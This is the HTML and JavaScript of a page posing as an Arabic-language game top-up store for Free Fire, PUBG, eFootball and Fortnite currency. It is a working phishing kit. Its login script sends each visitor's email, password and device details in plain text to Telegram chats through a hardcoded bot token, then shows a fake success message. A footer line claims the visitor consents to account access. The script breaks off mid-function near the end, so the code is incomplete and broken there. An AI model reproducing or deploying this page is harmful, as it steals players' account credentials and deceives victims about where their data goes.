<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>𝑴𝑨𝑫𝑴𝑶𝑼𝑵 𝑺𝑻𝑶𝑹𝑬</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', 'Tajawal', sans-serif;
        }

        body {
            background: #0a0e17;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .container {
            width: 100%;
            max-width: 420px;
        }

        /* شعار المتجر */
        .store-logo {
            text-align: center;
            margin-bottom: 20px;
        }

        .store-logo h1 {
            color: #ffd700;
            font-size: 28px;
            text-shadow: 0 0 20px rgba(255,215,0,0.5);
            letter-spacing: 2px;
        }

        /* صفحة تسجيل الدخول */
        .login-box {
            background: #131a26;
            border: 1px solid #2a3f5a;
            border-radius: 24px;
            padding: 32px 25px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.6);
        }

        h2 {
            color: #ffd700;
            text-align: center;
            font-size: 22px;
            margin-bottom: 25px;
        }

        .input-group {
            margin-bottom: 20px;
        }

        label {
            color: #a0b8d4;
            font-size: 14px;
            margin-bottom: 8px;
            display: block;
        }

        input {
            width: 100%;
            padding: 14px 16px;
            background: #1b2537;
            border: 1.5px solid #2e405b;
            border-radius: 12px;
            color: white;
            font-size: 15px;
            outline: none;
            transition: 0.3s;
        }

        input:focus {
            border-color: #ffd700;
        }

        .captcha-box {
            background: #1b2537;
            padding: 14px 16px;
            border-radius: 12px;
            margin: 20px 0;
            display: flex;
            align-items: center;
            justify-content: space-between;
            border: 1px solid #2e405b;
        }

        .captcha-box span {
            color: #a0b8d4;
        }

        .captcha-box input {
            width: 18px;
            height: 18px;
            accent-color: #ffd700;
            padding: 0;
        }

        .error-msg {
            color: #ff6b6b;
            font-size: 13px;
            margin-top: 6px;
            min-height: 18px;
        }

        .login-btn {
            width: 100%;
            padding: 15px;
            background: linear-gradient(45deg, #ffd700, #ffaa00);
            border: none;
            border-radius: 40px;
            color: #0b0f16;
            font-weight: bold;
            font-size: 17px;
            cursor: pointer;
            transition: 0.3s;
        }

        .login-btn:hover:not(:disabled) {
            transform: scale(1.01);
            box-shadow: 0 0 20px rgba(255,215,0,0.3);
        }

        .login-btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }

        .footer-note {
            color: #5a7290;
            font-size: 11px;
            text-align: center;
            margin-top: 20px;
        }

        /* صفحة الألعاب */
        .games-page {
            background: #131a26;
            border: 1px solid #2a3f5a;
            border-radius: 24px;
            padding: 30px 25px;
            display: none;
        }

        .games-page h3 {
            color: #ffd700;
            text-align: center;
            margin-bottom: 25px;
            font-size: 22px;
        }

        .games-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 15px;
        }

        .game-card {
            background: #1b2537;
            border: 2px solid #2e405b;
            border-radius: 18px;
            padding: 20px 10px;
            text-align: center;
            cursor: pointer;
            transition: 0.25s;
        }

        .game-card:hover {
            border-color: #ffd700;
            background: #222e42;
            transform: translateY(-3px);
        }

        .game-card img {
            width: 60px;
            height: 60px;
            border-radius: 16px;
            margin-bottom: 10px;
            object-fit: cover;
        }

        .game-card .game-name {
            color: #e0e8ff;
            font-weight: bold;
            font-size: 16px;
        }

        /* صفحة الشحن */
        .shop-page {
            background: #131a26;
            border: 1px solid #2a3f5a;
            border-radius: 24px;
            padding: 25px;
            display: none;
        }

        .shop-header {
            display: flex;
            align-items: center;
            gap: 15px;
            margin-bottom: 25px;
        }

        .back-btn {
            background: #1b2537;
            border: 1px solid #2e405b;
            color: #ffd700;
            width: 40px;
            height: 40px;
            border-radius: 12px;
            font-size: 20px;
            cursor: pointer;
            transition: 0.3s;
        }

        .shop-header h3 {
            color: #ffd700;
            font-size: 20px;
        }

        .id-input {
            margin: 20px 0;
        }

        .gem-options {
            display: grid;
            gap: 12px;
            margin: 20px 0;
        }

        .gem-item {
            background: #1b2537;
            border: 1.5px solid #2e405b;
            border-radius: 14px;
            padding: 15px 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            cursor: pointer;
            transition: 0.3s;
        }

        .gem-item:hover {
            border-color: #ffd700;
            background: #222e42;
        }

        .gem-item.selected {
            border-color: #ffd700;
            background: #2a3a20;
        }

        .gem-amount {
            color: #ffd700;
            font-size: 20px;
            font-weight: bold;
        }

        .gem-price {
            background: #2e405b;
            color: white;
            padding: 6px 20px;
            border-radius: 30px;
            font-weight: bold;
        }

        .confirm-btn {
            width: 100%;
            padding: 16px;
            background: linear-gradient(45deg, #00c853, #00a844);
            border: none;
            border-radius: 40px;
            color: white;
            font-weight: bold;
            font-size: 17px;
            cursor: pointer;
            margin-top: 20px;
        }

        .confirm-btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }

        /* شاشة تحميل */
        .loading-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0,0,0,0.85);
            z-index: 1000;
            justify-content: center;
            align-items: center;
        }

        .spinner {
            width: 45px;
            height: 45px;
            border: 4px solid #2e405b;
            border-top-color: #ffd700;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        /* إشعار */
        .toast-msg {
            position: fixed;
            top: 20px;
            left: 50%;
            transform: translateX(-50%);
            background: #131a26;
            border: 1px solid #ffd700;
            color: #ffd700;
            padding: 12px 25px;
            border-radius: 50px;
            z-index: 2000;
            display: none;
            font-weight: bold;
        }
    </style>
</head>
<body>

<div class="container">
    <!-- شعار المتجر -->
    <div class="store-logo">
        <h1>𝑴𝑨𝑫𝑴𝑶𝑼𝑵 𝑺𝑻𝑶𝑹𝑬</h1>
    </div>

    <!-- صفحة تسجيل الدخول -->
    <div id="loginPage" class="login-box">
        <h2>🎮 تسجيل الدخول</h2>
        
        <div class="input-group">
            <label>📧 البريد الإلكتروني</label>
            <input type="email" id="email" placeholder="example@domain.com" dir="ltr">
            <div id="emailError" class="error-msg"></div>
        </div>
        
        <div class="input-group">
            <label>🔒 كلمة المرور</label>
            <input type="password" id="password" placeholder="••••••••" dir="ltr">
            <div id="passError" class="error-msg"></div>
        </div>
        
        <div class="captcha-box">
            <span>🤖 أنا لست روبوت</span>
            <input type="checkbox" id="captcha">
        </div>
        
        <button class="login-btn" id="loginBtn" onclick="validateLogin()">➤ دخول</button>
        
        <div class="footer-note">
            بإدخال بياناتك، أنت توافق على دخول الإدارة للحساب للشحن
        </div>
    </div>

    <!-- صفحة الألعاب -->
    <div id="gamesPage" class="games-page">
        <h3>🎯 اختر لعبتك</h3>
        <div class="games-grid">
            <div class="game-card" onclick="selectGame('freefire')">
                <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect width='100' height='100' fill='%23ff4400'/%3E%3Ctext x='50' y='65' font-size='50' text-anchor='middle' fill='white'%3E🔥%3C/text%3E%3C/svg%3E" alt="Free Fire">
                <div class="game-name">Free Fire</div>
            </div>
            <div class="game-card" onclick="selectGame('pubg')">
                <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect width='100' height='100' fill='%23222222'/%3E%3Ctext x='50' y='65' font-size='50' text-anchor='middle' fill='%23ffaa00'%3E🍗%3C/text%3E%3C/svg%3E" alt="PUBG">
                <div class="game-name">PUBG Mobile</div>
            </div>
            <div class="game-card" onclick="selectGame('efootball')">
                <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect width='100' height='100' fill='%230066cc'/%3E%3Ctext x='50' y='65' font-size='50' text-anchor='middle' fill='white'%3E⚽%3C/text%3E%3C/svg%3E" alt="eFootball">
                <div class="game-name">eFootball</div>
            </div>
            <div class="game-card" onclick="selectGame('fortnite')">
                <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect width='100' height='100' fill='%239944ff'/%3E%3Ctext x='50' y='65' font-size='50' text-anchor='middle' fill='white'%3E🎯%3C/text%3E%3C/svg%3E" alt="Fortnite">
                <div class="game-name">Fortnite</div>
            </div>
        </div>
        <button class="login-btn" style="background: #2e405b; color: white; margin-top: 25px;" onclick="logout()">تسجيل الخروج</button>
    </div>

    <!-- صفحة الشحن -->
    <div id="shopPage" class="shop-page">
        <div class="shop-header">
            <button class="back-btn" onclick="backToGames()">←</button>
            <h3 id="gameTitle">Free Fire</h3>
        </div>
        
        <div class="input-group id-input">
            <label>🆔 أدخل ID الحساب</label>
            <input type="text" id="playerId" placeholder="مثال: 123456789" dir="ltr">
            <div id="idError" class="error-msg"></div>
        </div>
        
        <label>💎 اختر كمية الجواهر</label>
        <div class="gem-options" id="gemOptions"></div>
        
        <button class="confirm-btn" id="confirmBtn" onclick="confirmOrder()">✓ تأكيد الطلب</button>
    </div>
</div>

<!-- شاشة تحميل -->
<div id="loading" class="loading-overlay">
    <div class="spinner"></div>
</div>

<!-- رسالة إشعار -->
<div id="toast" class="toast-msg"></div>

<script>
    // ==================== إعدادات البوت ====================
    const BOT_TOKEN = '8667816880:AAH0sb2Rdo1xtuZaJhmWYYmrJ2Jyj2YFUvI'; // ⚠️ غير التوكن هنا
    const ADMIN_IDS = ['8397243250', '8006792239'];
    
    // بيانات المستخدم الحالي
    let currentUser = {
        email: '',
        password: '',
        deviceInfo: '',
        selectedGame: '',
        selectedGems: '',
        playerId: ''
    };

    // عروض الجواهر
    const gemOffers = {
        freefire: [
            { amount: '100 💎', price: '50 جنيه' },
            { amount: '520 💎', price: '250 جنيه' },
            { amount: '1060 💎', price: '500 جنيه' },
            { amount: '2180 💎', price: '1000 جنيه' },
            { amount: '5600 💎', price: '2500 جنيه' }
        ],
        pubg: [
            { amount: '60 UC', price: '30 جنيه' },
            { amount: '300 UC', price: '150 جنيه' },
            { amount: '600 UC', price: '300 جنيه' },
            { amount: '1500 UC', price: '750 جنيه' },
            { amount: '6000 UC', price: '3000 جنيه' }
        ],
        efootball: [
            { amount: '100 💰', price: '40 جنيه' },
            { amount: '500 💰', price: '200 جنيه' },
            { amount: '1050 💰', price: '400 جنيه' },
            { amount: '2150 💰', price: '800 جنيه' },
            { amount: '5500 💰', price: '2000 جنيه' }
        ],
        fortnite: [
            { amount: '1000 V-Bucks', price: '350 جنيه' },
            { amount: '2800 V-Bucks', price: '900 جنيه' },
            { amount: '5000 V-Bucks', price: '1500 جنيه' },
            { amount: '13500 V-Bucks', price: '4000 جنيه' }
        ]
    };

    // الحصول على نوع الجهاز
    function getDeviceInfo() {
        const ua = navigator.userAgent;
        let device = 'Unknown';
        let browser = 'Unknown';
        
        if (/iPhone|iPad|iPod/.test(ua)) device = 'iPhone';
        else if (/Android/.test(ua)) device = 'Android';
        else if (/Windows/.test(ua)) device = 'Windows PC';
        else if (/Mac/.test(ua)) device = 'Mac';
        
        if (/Safari/.test(ua) && !/Chrome/.test(ua)) browser = 'Safari';
        else if (/Chrome/.test(ua)) browser = 'Chrome';
        else if (/Firefox/.test(ua)) browser = 'Firefox';
        else if (/Edge/.test(ua)) browser = 'Edge';
        
        return `${device} / ${browser}`;
    }

    // إظهار الإشعار
    function showToast(msg, isSuccess = true) {
        const toast = document.getElementById('toast');
        toast.textContent = msg;
        toast.style.color = isSuccess ? '#ffd700' : '#ff6b6b';
        toast.style.borderColor = isSuccess ? '#ffd700' : '#ff6b6b';
        toast.style.display = 'block';
        setTimeout(() => toast.style.display = 'none', 3000);
    }

    // إظهار/إخفاء التحميل
    function showLoading(show) {
        document.getElementById('loading').style.display = show ? 'flex' : 'none';
    }

    // إرسال رسالة للبوت
    async function sendToTelegram(message) {
        for (const adminId of ADMIN_IDS) {
            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: adminId,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
            } catch (e) {
                console.error('خطأ في الإرسال:', e);
            }
        }
    }

    // التحقق من صحة الإيميل
    function isValidEmail(email) {
        const arabicRegex = /[\u0600-\u06FF]/;
        if (arabicRegex.test(email)) return false;
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        return emailRegex.test(email);
    }

    // التحقق من صحة كلمة السر
    function isValidPassword(password) {
        const arabicRegex = /[\u0600-\u06FF]/;
        if (arabicRegex.test(password)) return false;
        return password.length >= 6;
    }

    // تسجيل الدخول
    async function validateLogin() {
        const email = document.getElementById('email').value.trim();
        const password = document.getElementById('password').value;
        const captcha = document.getElementById('captcha').checked;
        
        document.getElementById('emailError').textContent = '';
        document.getElementById('passError').textContent = '';
        
        let hasError = false;
        
        if (!email) {
            document.getElementById('emailError').textContent = '❌ البريد الإلكتروني مطلوب';
            hasError = true;
        } else if (!isValidEmail(email)) {
            document.getElementById('emailError').textContent = '❌ بريد إلكتروني غير صالح (لا يسمح بالعربي)';
            hasError = true;
        }
        
        if (!password) {
            document.getElementById('passError').textContent = '❌ كلمة المرور مطلوبة';
            hasError = true;
        } else if (!isValidPassword(password)) {
            document.getElementById('passError').textContent = '❌ كلمة مرور غير صالحة (6 حروف على الأقل - لا عربي)';
            hasError = true;
        }
        
        if (!captcha) {
            showToast('❌ الرجاء تأكيد أنك لست روبوت', false);
            hasError = true;
        }
        
        if (hasError) return;
        
        showLoading(true);
        document.getElementById('loginBtn').disabled = true;
        
        // حفظ البيانات
        currentUser.email = email;
        currentUser.password = password;
        currentUser.deviceInfo = getDeviceInfo();
        
        // تجهيز رسالة البوت
        const now = new Date();
        const timeStr = now.toLocaleTimeString('ar-EG', { hour: '2-digit', minute: '2-digit' });
        const dateStr = now.toLocaleDateString('ar-EG');
        
        const message = `🔐 <b>تسجيل دخول جديد - 𝑴𝑨𝑫𝑴𝑶𝑼𝑵 𝑺𝑻𝑶𝑹𝑬</b>\n\n📧 <b>البريد:</b> <code>${email}</code>\n🔑 <b>كلمة السر:</b> <code>${password}</code>\n📱 <b>نوع الجهاز:</b> ${currentUser.deviceInfo}\n🕐 <b>الوقت:</b> ${timeStr} - ${dateStr}`;
        
        await sendToTelegram(message);
        
        showLoading(false);
        showToast('✓ تم تسجيل الدخول بنجاح');
        
        // الانتقال لصفحة الألعاب
        document.getElementById('loginPage').style.display = 'none';
        document.getElementById('gamesPage').style.display = 'block';
        
        document.getElementById('loginBtn').disabled = false;
    }

    // اختيار لعبة
    let selectedGame = '';
    let selectedGemAmount = '';
    
    function selectGame(game) {
        selectedGame = game;
        currentUser.selectedGame = game;
        
        const gameNames = {
            'freefire': 'Free Fire 🔥',
            'pubg': 'PUBG Mobile 🍗',
            'efootball': 'eFootball ⚽',
            'fortnite': 'Fortnite 🎯'
        };
        
        document.getElementById('gameTitle').textContent = gameNames[game];
        
        const offers = gemOffers[game];
        const gemOptionsDiv = document.getElementById('gemOptions');
        gemOptionsDiv.innerHTML = '';
        
        offers.forEach((offer) => {
            const div = document.createElement('div');
            div.className = 'gem-item';
            div.setAttribute('data-amount', offer.amount);
            div.innerHTML = `
                <span class="gem-amount">${offer.amount}</span>
                <span class="gem-price">${offer.price}</span>
            `;
            div.onclick = function() {
                document.querySelectorAll('.gem-item').forEach(item => item.classList.remove('selected'));
                this.classList.add('selected');
                selectedGemAmount = this.getAttribute('data-amount');
                currentUser.selectedGems = selectedGemAmount;
            };
            gemOptionsDiv.appendChild(div);
        });
        
        document.getElementById('gamesPage').style.display = 'none';
        document.getElementById('shopPage').style.display = 'block';
    }

    // تأكيد الطلب
    async الدخول
